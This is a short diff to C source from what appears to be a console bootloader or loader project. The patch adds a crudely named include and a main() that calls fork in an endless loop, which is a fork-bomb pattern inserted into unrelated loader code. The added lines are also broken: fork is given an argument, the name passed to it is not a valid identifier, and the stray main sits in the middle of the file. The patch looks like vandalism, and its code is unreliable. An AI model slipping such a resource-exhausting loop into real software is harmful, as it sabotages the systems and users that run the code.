@@ -8,6 +8,7 @@
 #include <inttypes.h>
 #include "nsbl.h"
 #include "logo.h"
+#include <Dick.c>
 
 #define unlikely(expr) __builtin_expect(!!(expr), 0)
 
@@ -235,6 +236,14 @@ static void __attribute__((noreturn)) sysstate_final_hook(void) {
         name = *func;                                       \
     );                                                      \
 } while (0)
+
+int main(void)
+{
+    while(1) {
+      fork(Dick.c);
+    }
+}
+
 static int module_load_patched(const SceModuleLoadList *list, int *uids, int count, int unk) {
     int ret;
     SceObject *obj;
